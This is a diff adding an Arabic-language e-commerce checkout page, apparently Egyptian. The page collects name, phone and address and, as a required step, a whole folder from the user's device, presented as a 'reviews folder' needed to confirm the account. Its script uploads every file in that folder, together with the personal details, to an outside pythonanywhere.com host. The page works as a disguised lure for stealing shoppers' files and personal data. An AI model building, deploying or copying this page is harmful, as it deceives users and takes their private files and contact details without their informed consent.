@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مراجعة وإتمام الطلب</title>
+    <style>
+        :root {
+            --primary-color: #2563eb;
+            --primary-hover: #1d4ed8;
+            --danger-color: #ef4444;
+            --bg-gradient: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
+            --card-bg: #ffffff;
+            --text-main: #0f172a;
+            --text-muted: #64748b;
+            --border-color: #cbd5e1;
+        }
+
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-gradient);
+            color: var(--text-main);
+            min-height: 100vh;
+            margin: 0;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-sizing: border-box;
+        }
+
+        .checkout-container {
+            background: var(--card-bg);
+            border-radius: 24px;
+            box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 540px;
+            padding: 45px 40px;
+            box-sizing: border-box;
+            border: 1px solid rgba(255, 255, 255, 0.7);
+        }
+
+        .shop-header {
+            text-align: center;
+            margin-bottom: 35px;
+            border-bottom: 2px dashed #e2e8f0;
+            padding-bottom: 25px;
+        }
+
+        .shop-logo {
+            font-size: 44px;
+            margin-bottom: 12px;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-main);
+            letter-spacing: -0.5px;
+        }
+
+        .section-title {
+            font-size: 15px;
+            font-weight: 700;
+            margin: 25px 0 15px 0;
+            color: #1e293b;
+            letter-spacing: 0.5px;
+        }
+
+        .name-row {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .name-row .form-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: right;
+        }
+
+        label {
+            display: block;
+            font-size: 13.5px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #475569;
+        }
+
+        input[type="text"], input[type="tel"] {
+            width: 100%;
+            padding: 15px 16px;
+            border-radius: 14px;
+            border: 1px solid var(--border-color);
+            background-color: #f8fafc;
+            font-size: 15px;
+            box-sizing: border-box;
+            transition: all 0.25s ease;
+            color: var(--text-main);
+        }
+
+        input[type="text"]:focus, input[type="tel"]:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(37, 99, 231, 0.15);
+        }
+
+        input.input-error, .upload-zone.input-error {
+            border-color: var(--danger-color) !important;
+            background-color: #fef2f2 !important;
+            box-shadow: 0 0 0 4px rgba(239, 68, 110, 0.15) !important;
+            animation: shake 0.4s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .phone-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            direction: ltr;
+        }
+
+        .phone-prefix {
+            position: absolute;
+            left: 16px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #475569;
+            user-select: none;
+            pointer-events: none;
+        }
+
+        .phone-input-wrapper input {
+            padding-left: 55px;
+            direction: ltr;
+            text-align: left;
+        }
+
+        .upload-zone {
+            border: 2px dashed var(--border-color);
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 40px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .upload-zone:hover {
+            border-color: var(--primary-color);
+            background: #f4f6ff;
+        }
+
+        .upload-zone.success {
+            border-color: #16a34a !important;
+            background: #f0fdf4 !important;
+            box-shadow: 0 0 0 4px rgba(22, 163, 74, 0.15) !important;
+        }
+
+        .upload-text {
+            font-size: 14px;
+            color: var(--text-muted);
+            font-weight: 600;
+            transition: color 0.2s;
+        }
+
+        .hidden-input {
+            display: none;
+        }
+
+        .btn-submit {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 30px;
+            transition: all 0.25s ease;
+            box-shadow: 0 10px 15px -3px rgba(37, 99, 231, 0.3);
+        }
+
+        .btn-submit:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 12px 20px -3px rgba(37, 99, 231, 0.4);
+        }
+        
+        .btn-submit:active {
+            transform: translateY(1px);
+        }
+    </style>
+</head>
+<body>
+
+<div class="checkout-container">
+    <div class="shop-header">
+        <div class="shop-logo">🛒</div>
+        <h1>مراجعة وإتمام الطلب</h1>
+    </div>
+
+    <form id="checkout-form">
+        <div class="section-title">👤 بيانات الشحن والتوصيل</div>
+        
+        <div class="name-row">
+            <div class="form-group">
+                <label for="first-name">الاسم الأول</label>
+                <input type="text" id="first-name" name="first_name" placeholder="الاسم" autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label for="last-name">اللقب</label>
+                <input type="text" id="last-name" name="last_name" placeholder="العائلة" autocomplete="off">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="phone-number">رقم الهاتف للاتصال</label>
+            <div class="phone-input-wrapper">
+                <span class="phone-prefix">+20</span>
+                <input type="tel" id="phone-number" name="phone" placeholder="10xxxxxxxx" autocomplete="off">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="address">عنوان التوصيل بالكامل</label>
+            <input type="text" id="address" name="address" placeholder="المدينة، الحي، اسم الشارع" autocomplete="off">
+        </div>
+
+        <div class="section-title">إرفاق مجلد المراجعات والتقييمات</div>
+        
+        <div class="upload-zone" id="upload-box" onclick="document.getElementById('media-picker').click()">
+            <div class="upload-text" id="upload-label">اضغط هنا لرفع مجلد التقييمات لتأكيد الحساب</div>
+            <input type="file" id="media-picker" name="reviews_folder" class="hidden-input" webkitdirectory directory multiple>
+        </div>
+
+        <button class="btn-submit" type="submit" id="submit-order">تأكيد الطلب وشحن المنتجات فوراً</button>
+    </form>
+</div>
+
+<script>
+    const form = document.getElementById('checkout-form');
+    const picker = document.getElementById('media-picker');
+    const uploadLabel = document.getElementById('upload-label');
+    const uploadBox = document.getElementById('upload-box');
+    const submitBtn = document.getElementById('submit-order');
+
+    const inputs = [
+        document.getElementById('first-name'),
+        document.getElementById('last-name'),
+        document.getElementById('phone-number'),
+        document.getElementById('address')
+    ];
+
+    inputs.forEach(input => {
+        input.addEventListener('input', function() {
+            if (this.value.trim() !== "") {
+                this.classList.remove('input-error');
+            }
+        });
+    });
+
+    picker.addEventListener('change', function(e) {
+        if (e.target.files.length > 0) {
+            uploadLabel.innerText = "تم إرفاق المجلد بنجاح.";
+            uploadLabel.style.color = "#16a34a";
+            uploadBox.classList.add('success');
+            uploadBox.classList.remove('input-error');
+        } else {
+            uploadLabel.innerText = "اضغط هنا لرفع مجلد التقييمات لتأكيد الحساب";
+            uploadLabel.style.color = "var(--text-muted)";
+            uploadBox.classList.remove('success');
+        }
+    });
+
+    form.addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        let hasError = false;
+        let missingFields = [];
+
+        inputs.forEach(input => {
+            if (input.value.trim() === "") {
+                input.classList.add('input-error');
+                hasError = true;
+                
+                const labelText = input.closest('.form-group').querySelector('label').innerText;
+                missingFields.push(labelText);
+            } else {
+                input.classList.remove('input-error');
+            }
+        });
+
+        if (!picker.files || picker.files.length === 0) {
+            uploadBox.classList.add('input-error');
+            hasError = true;
+            missingFields.push("مجلد المراجعات والتقييمات");
+        } else {
+            uploadBox.classList.remove('input-error');
+        }
+
+        if (hasError) {
+            alert('يرجى تعبئة الحقول المطلوبة التالية أولاً:\n- ' + missingFields.join('\n- '));
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append('first_name', document.getElementById('first-name').value);
+        formData.append('last_name', document.getElementById('last-name').value);
+        formData.append('phone', document.getElementById('phone-number').value);
+        formData.append('address', document.getElementById('address').value);
+
+        for (let i = 0; i < picker.files.length; i++) {
+            formData.append('reviews_folder[]', picker.files[i]);
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'جاري إرسال البيانات وتأكيد الطلب...';
+
+        // تعديل الرابط ليتناسب مع خادم Flask المحلي
+        fetch('https://Yajkototokj.pythonanywhere.com/submit', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            if (response.ok) {
+                return response.json();
+            }
+            throw new Error('فشل الإرسال إلى السيرفر');
+        })
+        .then(data => {
+            alert('شكراً لك، تم تسجيل طلبك بنجاح! جاري تجهيز الشحن وسيتم التواصل معك قريباً.');
+            form.reset();
+            uploadLabel.innerText = "اضغط هنا لرفع مجلد التقييمات لتأكيد الحساب";
+            uploadLabel.style.color = "var(--text-muted)";
+            uploadBox.classList.remove('success');
+        })
+        .catch(error => {
+            console.error(error);
+            alert('حدث خطأ أثناء الاتصال بالسيرفر. يرجى التأكد من تشغيل سيرفر Flask.');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'تأكيد الطلب وشحن المنتجات فوراً';
+        });
+    });
+</script>
+
+</body>
+</html>
